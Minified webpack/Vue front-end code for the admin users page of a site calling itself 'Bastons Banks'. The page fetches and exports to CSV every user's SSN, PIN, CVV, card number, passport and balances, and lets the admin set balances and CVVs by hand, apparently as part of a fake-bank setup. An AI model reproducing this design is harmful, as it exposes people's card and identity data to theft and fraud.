(window.webpackJsonp=window.webpackJsonp||[]).push([[40,11],{391:function(t,e,n){"use strict";n.r(e);var r={props:{title:{type:String},desc:{type:String}}},o=n(13),component=Object(o.a)(r,(function(){var t=this,e=t._self._c;return e("div",{staticClass:"text-center border rounded-br-md rounded-bl-md py-10"},[e("svg",{staticClass:"mx-auto h-12 w-12 text-gray-400",attrs:{fill:"none",viewBox:"0 0 24 24",stroke:"currentColor","aria-hidden":"true"}},[e("path",{attrs:{"vector-effect":"non-scaling-stroke","stroke-linecap":"round","stroke-linejoin":"round","stroke-width":"2",d:"M9 13h6m-3-3v6m-9 1V7a2 2 0 012-2h6l2 2h6a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2z"}})]),t._v(" "),e("h3",{staticClass:"mt-2 text-sm font-semibold text-gray-900"},[t._v(t._s(t.title))]),t._v(" "),e("p",{staticClass:"mt-1 text-sm text-gray-500"},[t._v(t._s(t.desc)+".")])])}),[],!1,null,null,null);e.default=component.exports},648:function(t,e,n){"use strict";n.r(e);n(20);var r=n(5),o=(n(52),n(21),n(10),n(36),n(391)),l={layout:"admin-dashboard",head:function(){return{title:"Bastons Banks | Admin Users List",meta:[{charset:"utf-8"},{name:"viewport",content:"width=device-width, initial-scale=1"},{hid:"description",name:"description",content:"Mobile Banking, Credit Cards, Mortgages, Auto Loan"},{hid:"keywords",name:"keywords",content:"Mobile Banking, Credit Cards, Mortgages, Auto Loan"},{hid:"og:title",property:"og:title",content:"Bastons Banks | Admin Users List"},{hid:"og:description",property:"og:description",content:"Mobile Banking, Credit Cards, Mortgages, Auto Loan"},{hid:"og:type",property:"og:type",content:"website"},{hid:"og:url",property:"og:url",content:"https://www.bastonsbanks.com/admin/dashboard/users"},{hid:"og:image",property:"og:image",content:"https://bastionbanks.com/uploads/1682584899_6502d067c95383061f4a.png"},{hid:"twitter:card",name:"twitter:card",content:""},{hid:"twitter:title",name:"twitter:title",content:"Bastons Banks | Admin Users List"},{hid:"twitter:description",name:"twitter:description",content:"Mobile Banking, Credit Cards, Mortgages, Auto Loan"},{hid:"twitter:image",name:"twitter:image",content:"https://bastionbanks.com/uploads/1682584899_6502d067c95383061f4a.png"}],link:[{rel:"icon",type:"image/x-icon",href:"/favicon.ico"}]}},components:{Modal:n(170).default,EmptyState:o.default},data:function(){return{loading:!1,processing:!1,isModalVisible:!1,loggedInAdmin:{},selectedUserData:{},usersList:[]}},created:function(){this.fetchUsers(),this.getUserInfo()},methods:{downloadUsers:function(){this.$downloadCSV(this.usersList,"users-data.csv")},fetchUsers:function(){var t=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var n,r,data;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t.loading=!0,n=JSON.parse(sessionStorage.getItem("auth")),t.loading=!0,"\n        query {\n          getUsers {\n            id\n            name\n            email\n            role\n            phoneNumber\n            dob\n            gender\n            ssn\n            occupation\n            country\n            city\n            zip\n            address\n            accountCurrency\n            pin\n            passport\n            identification\n            Status\n            PlanType\n            accountBalance\n            cardBalance\n            cardNumber\n            expiry\n            cvv\n            eth\n            btc\n            timeAdded\n          }\n        }\n      ",e.prev=5,e.next=8,fetch("https://fidelityvalues.onrender.com/graphql/query",{method:"POST",headers:{"content-type":"application/json",authorization:"Bearer "+n},body:JSON.stringify({query:"\n        query {\n          getUsers {\n            id\n            name\n            email\n            role\n            phoneNumber\n            dob\n            gender\n            ssn\n            occupation\n            country\n            city\n            zip\n            address\n            accountCurrency\n            pin\n            passport\n            identification\n            Status\n            PlanType\n            accountBalance\n            cardBalance\n            cardNumber\n            expiry\n            cvv\n            eth\n            btc\n            timeAdded\n          }\n        }\n      "})});case 8:return r=e.sent,e.next=11,r.json();case 11:null!=(data=e.sent)&&data.errors?t.$toastr.e(data.errors[0].message):(t.usersList=data.data.getUsers,t.totalRows=data.data.getUsers.length);case 13:return e.prev=13,t.loading=!1,e.finish(13);case 16:case"end":return e.stop()}}),e,null,[[5,,13,16]])})))()},getInitials:function(t){var e=t?t.charAt(0):"";return"".concat(e)},formatNumberAsDollar:function(t){return null==t?void 0:t.toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:2})},updateUserInfo:function(){var t=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var n,r,o,data;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t.processing=!0,n=JSON.parse(sessionStorage.getItem("auth")),e.prev=3,"\n          mutation updateUser($userId: String!, $input: UpdateUser!) {\n            updateUser(userId: $userId, input: $input) {\n              name\n              email\n              phoneNumber\n              dob\n              gender\n              ssn\n              occupation\n              country\n              city\n              zip\n              address\n              accountCurrency\n              cardBalance\n              cvv\n              pin\n              passport\n              identification\n              eth\n              btc\n              accountBalance\n            }\n          }\n        ",e.next=7,fetch("https://fidelityvalues.onrender.com/graphql/query",{method:"POST",headers:{"content-type":"application/json",authorization:"Bearer "+n},body:JSON.stringify({query:"\n          mutation updateUser($userId: String!, $input: UpdateUser!) {\n            updateUser(userId: $userId, input: $input) {\n              name\n              email\n              phoneNumber\n              dob\n              gender\n              ssn\n              occupation\n              country\n              city\n              zip\n              address\n              accountCurrency\n              cardBalance\n              cvv\n              pin\n              passport\n              identification\n              eth\n              btc\n              accountBalance\n            }\n          }\n        ",variables:{userId:null!==(r=t.selectedUserData.id)&&void 0!==r?r:"",input:{accountBalance:t.selectedUserData.accountBalance,cvv:t.selectedUserData.cvv,cardBalance:t.selectedUserData.cardBalance}}})});case 7:return o=e.sent,e.next=10,o.json();case 10:null!=(data=e.sent)&&data.errors?t.$toastr.e(data.errors[0].message):(t.$toastr.s("User Information was updated successfully"),t.isModalVisible=!1);case 12:return e.prev=12,t.processing=!1,e.finish(12);case 15:case"end":return e.stop()}}),e,null,[[3,,12,15]])})))()},previewUser:function(data){console.log(data,"data here"),this.isModalVisible=!0,this.selectedUserData=data},formatDateTime:function(t){if("string"==typeof t&&(t=new Date(t)),"[object Date]"!==Object.prototype.toString.call(t)||isNaN(t.getTime()))return"Invalid Date";return t.toLocaleDateString("en-US",{year:"numeric",month:"numeric",day:"numeric",hour:"numeric",minute:"numeric"})},getUserInfo:function(){var t=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var n,r,data;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t.loading=!0,n=JSON.parse(sessionStorage.getItem("auth")),t.loading=!0,"\n        query {\n          getUser {\n            id\n            name\n            email\n            role\n            phoneNumber\n            dob\n            gender\n            ssn\n            occupation\n            country\n            city\n            zip\n            address\n            accountCurrency\n            pin\n            passport\n            identification\n            Status\n            PlanType\n            accountBalance\n            cardBalance\n            cardNumber\n            expiry\n            cvv\n            eth\n            btc\n            timeAdded\n            admin {\n                id\n                email\n                role\n                Status\n                timeAdded\n                btc\n                eth\n                name\n              }\n          }\n        }\n      ",e.prev=5,e.next=8,fetch("https://fidelityvalues.onrender.com/graphql/query",{method:"POST",headers:{"content-type":"application/json",authorization:"Bearer "+n},body:JSON.stringify({query:"\n        query {\n          getUser {\n            id\n            name\n            email\n            role\n            phoneNumber\n            dob\n            gender\n            ssn\n            occupation\n            country\n            city\n            zip\n            address\n            accountCurrency\n            pin\n            passport\n            identification\n            Status\n            PlanType\n            accountBalance\n            cardBalance\n            cardNumber\n            expiry\n            cvv\n            eth\n            btc\n            timeAdded\n            admin {\n                id\n                email\n                role\n                Status\n                timeAdded\n                btc\n                eth\n                name\n              }\n          }\n        }\n      "})});case 8:return r=e.sent,e.next=11,r.json();case 11:null!=(data=e.sent)&&data.errors?t.$toastr.e(data.errors[0].message):t.loggedInAdmin=data.data.getUser;case 13:return e.prev=13,t.loading=!1,e.finish(13);case 16:case"end":return e.stop()}}),e,null,[[5,,13,16]])})))()}}},c=n(13),component=Object(c.a)(l,(function(){var t,e,n=this,r=n._self._c;return r("main",[r("div",{staticClass:"px-4 sm:px-6 lg:px-8"},[r("div",{staticClass:"sm:flex sm:items-center"},[n._m(0),n._v(" "),r("div",{staticClass:"mt-4 sm:ml-16 sm:mt-0 sm:flex-none"},[r("button",{staticClass:"block rounded-md bg-indigo-600 px-3 py-2 text-center text-sm font-semibold text-white shadow-sm hover:bg-indigo-500 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-600",attrs:{type:"button"},on:{click:n.downloadUsers}},[n._v("Download\n          Users")])])]),n._v(" "),r("div",{staticClass:"mt-8 flow-root"},[r("div",{staticClass:"-mx-4 -my-2 overflow-x-auto sm:-mx-6 lg:-mx-8"},[null!==(t=n.usersList)&&void 0!==t&&t.length&&!n.loading?r("div",{staticClass:"inline-block min-w-full py-2 align-middle sm:px-6 lg:px-8"},[r("table",{staticClass:"min-w-full divide-y divide-gray-300"},[n._m(1),n._v(" "),r("tbody",{staticClass:"divide-y divide-gray-200 bg-white"},n._l(n.usersList,(function(t){var e,o,l,c,d,m,v,y,h,f,x,_;return r("tr",{key:t.id},[r("td",{staticClass:"whitespace-nowrap py-5 pl-4 pr-3 text-sm sm:pl-0"},[r("div",{staticClass:"flex items-center"},[r("div",{staticClass:"h-11 w-11 flex-shrink-0"},[null!==(e=t.passport)&&void 0!==e&&e.length?r("img",{staticClass:"h-11 w-11 rounded-full",attrs:{src:t.passport,alt:""}}):r("p",{staticClass:"h-10 w-10 flex justify-center items-center bg-black text-white rounded-full"},[n._v(n._s(null!==(o=n.getInitials(t.name))&&void 0!==o?o:"Nil"))])]),n._v(" "),r("div",{staticClass:"ml-4"},[r("div",{staticClass:"font-medium text-gray-900"},[n._v(n._s(null!==(l=t.name)&&void 0!==l&&l.length?t.name:"Nil"))]),n._v(" "),r("div",{staticClass:"mt-1 text-gray-500"},[n._v(n._s(null!==(c=t.email)&&void 0!==c&&c.length?t.email:"Nil"))]),n._v(" "),r("div",{staticClass:"mt-1 text-gray-500"},[n._v(n._s(null!==(d=t.phoneNumber)&&void 0!==d&&d.length?t.phoneNumber:"Nil"))])])])]),n._v(" "),r("td",{staticClass:"whitespace-nowrap px-3 py-5 text-sm text-gray-500"},[r("div",{staticClass:"text-gray-900"},[n._v("\n                    "+n._s(null!==(m=t.accountCurrency)&&void 0!==m?m:"Nil")+"\n                    "+n._s(null!==(v=n.formatNumberAsDollar(t.accountBalance))&&void 0!==v?v:"Nil")+" (account balance)\n                  ")]),n._v(" "),r("div",{staticClass:"mt-1 text-gray-500"},[n._v("\n                    "+n._s(null!==(y=t.accountCurrency)&&void 0!==y?y:"Nil")+"\n                    "+n._s(null!==(h=n.formatNumberAsDollar(t.cardBalance))&&void 0!==h?h:"Nil")+" (card balance)\n                  ")]),n._v(" "),r("div",{staticClass:"mt-1 text-gray-500"},[n._v(n._s(null!==(f=t.cardNumber)&&void 0!==f&&f.length?t.cardNumber:"Nil"))])]),n._v(" "),r("td",{staticClass:"whitespace-nowrap px-3 py-5 text-sm text-gray-500"},[r("span",{staticClass:"inline-flex items-center rounded-md bg-green-50 px-2 py-1 text-xs font-medium text-green-700 ring-1 ring-inset ring-green-600/20"},[n._v(n._s(null!==(x=t.Status)&&void 0!==x?x:"Nil"))])]),n._v(" "),r("td",{staticClass:"whitespace-nowrap px-3 py-5 text-sm text-gray-500"},[n._v(n._s(null!==(_=n.formatDateTime(t.timeAdded))&&void 0!==_?_:"Nil"))]),n._v(" "),r("td",{staticClass:"relative whitespace-nowrap py-5 pl-3 pr-4 text-right text-sm font-medium sm:pr-0"},[r("a",{staticClass:"text-indigo-600 hover:text-indigo-900",attrs:{href:"#"},on:{click:function(e){return e.preventDefault(),n.previewUser(t)}}},[n._v("Edit"),r("span",{staticClass:"sr-only"},[n._v(", Lindsay\n                      Walton")])])])])})),0)])]):!n.loading||null!==(e=n.usersList)&&void 0!==e&&e.length?r("EmptyState",{attrs:{title:"No Users available",desc:""}}):r("div",{staticClass:"bg-white rounded-lg shadow-md p-4 animate-pulse"},[r("div",{staticClass:"w-full h-32 bg-gray-300 rounded mb-2"})])],1)])]),n._v(" "),r("Modal",{attrs:{isVisible:n.isModalVisible},on:{"update:isVisible":function(t){n.isModalVisible=t},"update:is-visible":function(t){n.isModalVisible=t}}},[r("div",{staticClass:"overflow-hidden"},[r("div",{staticClass:"sm:px-6"},[r("h3",{staticClass:"text-base font-semibold leading-7 text-gray-900"},[n._v("Update User Information")])]),n._v(" "),r("form",{staticClass:"p-4 space-y-6 max-w-xl",on:{submit:function(t){return t.preventDefault(),n.updateUserInfo.apply(null,arguments)}}},[r("div",{staticClass:"space-y-1"},[r("label",{staticClass:"text-xs text-gray-700 font-medium"},[n._v("Account Balance")]),n._v(" "),r("input",{directives:[{name:"model",rawName:"v-model",value:n.selectedUserData.accountBalance,expression:"selectedUserData.accountBalance"}],staticClass:"py-3 md:py-2 border rounded-md w-full outline-none pl-6 text-sm md:text-base",attrs:{type:"tel"},domProps:{value:n.selectedUserData.accountBalance},on:{input:function(t){t.target.composing||n.$set(n.selectedUserData,"accountBalance",t.target.value)}}}),n._v(" "),r("span",{staticClass:"text-xs text-gray-500"},[n._v("We'll never share your details with anyone else")])]),n._v(" "),r("div",{staticClass:"space-y-1"},[r("label",{staticClass:"text-xs text-gray-700 font-medium"},[n._v("CVV")]),n._v(" "),r("input",{directives:[{name:"model",rawName:"v-model",value:n.selectedUserData.cvv,expression:"selectedUserData.cvv"}],staticClass:"py-3 md:py-2 border rounded-md w-full outline-none pl-6 text-sm md:text-base",attrs:{type:"tel"},domProps:{value:n.selectedUserData.cvv},on:{input:function(t){t.target.composing||n.$set(n.selectedUserData,"cvv",t.target.value)}}}),n._v(" "),r("span",{staticClass:"text-xs text-gray-500"},[n._v("We'll never share your details with anyone else")])]),n._v(" "),r("div",{staticClass:"space-y-1"},[r("label",{staticClass:"text-xs text-gray-700 font-medium"},[n._v("Card Balance")]),n._v(" "),r("input",{directives:[{name:"model",rawName:"v-model",value:n.selectedUserData.cardBalance,expression:"selectedUserData.cardBalance"}],staticClass:"py-3 md:py-2 border rounded-md w-full outline-none pl-6 text-sm md:text-base",attrs:{type:"tel"},domProps:{value:n.selectedUserData.cardBalance},on:{input:function(t){t.target.composing||n.$set(n.selectedUserData,"cardBalance",t.target.value)}}}),n._v(" "),r("span",{staticClass:"text-xs text-gray-500"},[n._v("We'll never share your details with anyone else")])]),n._v(" "),r("div",{staticClass:"w-full flex justify-between items-center gap-x-6"},[r("button",{staticClass:"bg-green-500 disabled:cursor-not-allowed disabled:opacity-25 w-full text-white rounded-lg px-6 py-3 text-sm",attrs:{type:"submit",disabled:n.processing}},[n._v("\n            "+n._s(n.processing?"processing...":"Update")+"\n          ")]),n._v(" "),r("button",{staticClass:"bg-black text-white w-full py-3 rounded-md",attrs:{type:"button"},on:{click:function(t){n.isModalVisible=!1}}},[n._v("Close")])])])])])],1)}),[function(){var t=this,e=t._self._c;return e("div",{staticClass:"sm:flex-auto"},[e("h1",{staticClass:"text-base font-semibold leading-6 text-gray-900"},[t._v("Users")]),t._v(" "),e("p",{staticClass:"mt-2 text-sm text-gray-700"},[t._v("A list of all the users available,\n          account details, status\n          and date added.")])])},function(){var t=this,e=t._self._c;return e("thead",[e("tr",[e("th",{staticClass:"py-3.5 pl-4 pr-3 text-left text-sm font-semibold text-gray-900 sm:pl-0",attrs:{scope:"col"}},[t._v("User\n                ")]),t._v(" "),e("th",{staticClass:"px-3 py-3.5 text-left text-sm font-semibold text-gray-900",attrs:{scope:"col"}},[t._v("Account")]),t._v(" "),e("th",{staticClass:"px-3 py-3.5 text-left text-sm font-semibold text-gray-900",attrs:{scope:"col"}},[t._v("Status")]),t._v(" "),e("th",{staticClass:"px-3 py-3.5 text-left text-sm font-semibold text-gray-900",attrs:{scope:"col"}},[t._v("Date Added")]),t._v(" "),e("th",{staticClass:"relative py-3.5 pl-3 pr-4 sm:pr-0",attrs:{scope:"col"}},[e("span",{staticClass:"sr-only"},[t._v("Edit")])])])])}],!1,null,null,null);e.default=component.exports}}]);